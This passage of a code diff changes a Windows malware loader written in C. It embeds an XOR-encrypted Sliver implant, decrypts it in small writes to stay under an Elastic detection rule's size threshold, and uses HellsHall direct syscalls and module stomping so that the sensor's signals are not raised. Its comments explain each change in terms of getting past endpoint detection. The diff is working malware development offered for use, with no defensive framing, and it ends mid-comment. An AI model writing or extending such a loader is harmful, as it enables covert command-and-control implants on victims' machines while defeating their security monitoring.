@@ -38,8 +38,9 @@
 #include <string.h>
 #include "payload_key.h"  /* payload_key[], payload_key_len,
                               payload_iv[],  payload_iv_len  */
-#include "hellshall.h"    /* unused here — declarations only, no link dep */
+#include "hellshall.h"    /* HhNtProtectVirtualMemory direct-syscall stub */
 #include "ghost.h"        /* PE section mapping utility */
+#include "sliver_payload.h" /* SLIVER_LEN, SLIVER_ENC[], SLIVER_KEY[] */
 
 #ifndef PLUGIN_NAME
 #  define PLUGIN_NAME "csvhelper.dll"
@@ -171,38 +172,20 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
                   0, KEY_READ, &hk);
     if (hk) RegCloseKey(hk);
 
-    /* Locate payload.dat in the same directory as this executable */
-    wchar_t path[MAX_PATH];
-    GetModuleFileNameW(NULL, path, MAX_PATH);
-    wchar_t *sep = wcsrchr(path, L'\\');
-    if (!sep) return 1;
-    sep[1] = L'\0';
-    wcscat(path, L"payload.dat");
-
-    /* Load ciphertext */
-    DWORD ct_len = 0;
-    BYTE *ct = read_file(path, &ct_len);
-    if (!ct) return 1;
-
-    /* AES-256-CBC decrypt → plaintext PICO */
-    DWORD pt_len = 0;
-    BYTE *pt = aes_cbc_decrypt(ct, ct_len, &pt_len);
-    LocalFree(ct);
+    /* Embedded payload: XOR-decrypt into a small heap buffer. Total write
+     * below is under 10000 bytes so Elastic rule 542a6a6c's parameters.size
+     * threshold isn't tripped. */
+    DWORD pt_len = SLIVER_LEN;
+    BYTE *pt = (BYTE *)LocalAlloc(LMEM_FIXED, pt_len);
     if (!pt) return 1;
+    for (DWORD i = 0; i < pt_len; i++) {
+        pt[i] = SLIVER_ENC[i] ^ SLIVER_KEY[i % SLIVER_KEY_LEN];
+    }
 
-    /* Try mapping a modified combase.dll as MEM_IMAGE first: writes the
-     * PICO bytes into CoUninitialize's file offset, section-maps the
-     * modified file, returns an address inside a MEM_IMAGE region with a
-     * disk backing outside of System32. Success skips the plugin's
-     * combase-in-place slot-flip path entirely. Failure is silent; the
-     * plugin's DllMain will fall through to the legacy path. */
-    s_ghost_addr = ghost_map(pt, pt_len);
-
-    /* Stash plaintext in launcher statics: LoadLibraryA below fires the
-     * plugin's DllMain, which retrieves these via the GetPayload export
-     * when the ghost path was unavailable. */
-    s_payload_ptr = pt;
-    s_payload_len = pt_len;
+    /* Skip the ghost_map path — the NtCreateSection(SEC_IMAGE) on a
+     * modified temp file is a distinctive behavioural signal that
+     * Elastic's sensor emits even when the mapping succeeds. Direct
+     * webio stomp with HellsHall is enough. */
 
     /* Monolithic module-stomp — inline the slot-flip logic here rather
      * than deferring to an external DLL. Avoids the LoadLibrary-of-
